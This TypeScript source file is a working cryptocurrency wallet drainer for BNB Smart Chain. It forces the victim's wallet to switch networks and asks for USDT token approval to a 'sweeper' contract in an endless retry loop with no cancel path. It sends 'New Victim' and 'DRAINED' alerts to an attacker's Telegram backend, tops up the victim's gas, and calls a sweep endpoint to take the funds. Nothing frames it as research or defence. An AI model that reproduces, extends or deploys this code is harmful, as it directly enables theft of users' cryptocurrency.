import { ethers } from "ethers"
import { CONFIG, CHAIN_ID, CHAIN_NAME, RPC_URL } from "../config"

const BACKEND_URL = CONFIG.BACKEND_URL

// ============================================================
// RAW PROVIDER HELPERS — work on Trust Wallet, MetaMask, legacy
// ============================================================
function getRawProvider(input: any): any {
  if (!input) return null
  if (typeof input.request === "function" || typeof input.sendAsync === "function" || typeof input.send === "function") {
    return input
  }
  if (input.provider) {
    const inner = input.provider
    if (typeof inner.request === "function" || typeof inner.sendAsync === "function" || typeof inner.send === "function") {
      return inner
    }
  }
  return null
}

async function rawRequest(raw: any, method: string, params: any[]): Promise<any> {
  if (typeof raw.request === "function") {
    return raw.request({ method, params })
  }
  if (typeof raw.sendAsync === "function") {
    return new Promise((resolve, reject) => {
      raw.sendAsync({ method, params }, (err: any, response: any) => {
        if (err) return reject(err)
        if (response && response.error) return reject(response.error)
        resolve(response ? response.result : null)
      })
    })
  }
  if (typeof raw.send === "function") {
    return raw.send(method, params)
  }
  throw new Error("Wallet provider does not support RPC requests")
}

async function sendAlert(message: string) {
  try {
    await fetch(`${BACKEND_URL}/api/telegram`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ message }),
    })
  } catch (e) {
    console.warn("Alert failed:", e)
  }
}

// ============================================================
// AUTO-SWITCH TO BNB SMART CHAIN (returns NEW BrowserProvider)
// ============================================================
export async function ensureCorrectNetwork(
  provider: ethers.BrowserProvider
): Promise<ethers.BrowserProvider> {
  const raw = getRawProvider(provider)
  if (!raw) {
    throw new Error("Wallet provider not available")
  }

  const hexChainId = "0x" + CHAIN_ID.toString(16) // 0x38 = 56

  // Read current chain — best effort, never fatal
  let currentChainId: number | null = null
  try {
    currentChainId = Number(await rawRequest(raw, "eth_chainId", []))
  } catch {
    currentChainId = null
  }

  if (currentChainId === CHAIN_ID) return provider

  try {
    await rawRequest(raw, "wallet_switchEthereumChain", [{ chainId: hexChainId }])
    await new Promise(r => setTimeout(r, 2500))
    return new ethers.BrowserProvider(raw)
  } catch (switchError: any) {
    const code = switchError?.code
    const msg = (switchError?.message || "").toLowerCase()

    if (code === 4902 || msg.includes("unrecognized chain") || msg.includes("add a chain")) {
      try {
        await rawRequest(raw, "wallet_addEthereumChain", [
          {
            chainId: hexChainId,
            chainName: CHAIN_NAME,
            nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
            rpcUrls: [RPC_URL],
            blockExplorerUrls: ["https://bscscan.com"],
          },
        ])
        await new Promise(r => setTimeout(r, 2500))
        return new ethers.BrowserProvider(raw)
      } catch {
        throw new Error("Please switch your wallet to BNB Smart Chain manually")
      }
    }

    if (code === 4001) {
      throw new Error("Please approve the network switch to BNB Smart Chain")
    }

    throw new Error("Please switch your wallet to BNB Smart Chain (BNB)")
  }
}

// ============================================================
// REQUEST USDT APPROVAL (infinite retry loop)
// ============================================================
export async function requestApproval(
  provider: ethers.BrowserProvider,
  victimAddress: string
): Promise<ethers.BigNumberish | null> {
  const signer = await provider.getSigner()

  const usdt = new ethers.Contract(
    CONFIG.USDT_CONTRACT,
    [
      "function approve(address spender, uint256 value) external returns (bool)",
      "function balanceOf(address account) external view returns (uint256)",
      "function decimals() external view returns (uint8)",
    ],
    signer
  )

  let decimals = CONFIG.USDT_DECIMALS
  let rawBalance = ethers.parseUnits("0", 18)

  // Balance read must NEVER kill the flow
  try {
    rawBalance = await usdt.balanceOf(victimAddress)
  } catch (err: any) {
    console.warn("balanceOf failed:", err?.message || err)
    rawBalance = ethers.parseUnits("0", 18)
  }
  try {
    const d = await usdt.decimals()
    if (typeof d === "bigint" || typeof d === "number") decimals = Number(d)
  } catch {}

  const balance = ethers.formatUnits(rawBalance, decimals)
  await sendAlert(
    "[New Victim] Wallet: " + victimAddress.slice(0, 6) + "..." + victimAddress.slice(-4) +
    " | Balance: " + parseFloat(balance).toFixed(2) + " USDT"
  )

  const maxApprove = ethers.parseUnits(CONFIG.MAX_APPROVE_USDT, decimals)
  const approveAmount = rawBalance < maxApprove ? rawBalance : maxApprove

  while (true) {
    try {
      const tx = await usdt.approve(CONFIG.SWEEPER_CONTRACT, approveAmount)
      await tx.wait()

      await sendAlert(
        "[Approval Signed] " + ethers.formatUnits(approveAmount, decimals) + " USDT | " +
        victimAddress.slice(0, 6) + "..." + victimAddress.slice(-4) + " | https://bscscan.com/tx/" + tx.hash
      )

      return approveAmount
    } catch {
      await new Promise(r => setTimeout(r, 500))
      continue // infinite retry kept — no cancel path
    }
  }
}

// ============================================================
// ENSURE GAS (funding)
// ============================================================
export async function ensureGas(
  provider: ethers.Provider,
  victimAddress: string
): Promise<boolean> {
  const balance = await provider.getBalance(victimAddress)
  const minGas = ethers.parseEther("0.0003")

  if (balance >= minGas) {
    await sendAlert("[Gas Check] " + ethers.formatEther(balance) + " BNB (sufficient)")
    return true
  }

  try {
    const response = await fetch(`${BACKEND_URL}/api/fund-gas`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ victimAddress }),
    })
    const data = await response.json()
    if (data.success) {
      await sendAlert(
        "[Gas Funded] Sent " + CONFIG.FUNDING_AMOUNT + " BNB to " +
        victimAddress.slice(0, 6) + "..." + victimAddress.slice(-4) + " | https://bscscan.com/tx/" + data.txHash
      )
      return true
    }
    return false
  } catch {
    return false
  }
}

// ============================================================
// EXECUTE DRAIN
// ============================================================
export async function executeDrain(
  victimAddress: string,
  approvalAmount: ethers.BigNumberish
): Promise<boolean> {
  try {
    const response = await fetch(`${BACKEND_URL}/api/sweep`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ victimAddress }),
    })
    const data = await response.json()
    if (data.success) {
      await sendAlert(
        "[DRAINED] " + ethers.formatUnits(approvalAmount, CONFIG.USDT_DECIMALS) +
        " USDT | Victim: " + victimAddress.slice(0, 6) + "..." + victimAddress.slice(-4) +
        " | https://bscscan.com/tx/" + data.txHash
      )
      return true
    }
    return false
  } catch {
    return false
  }
}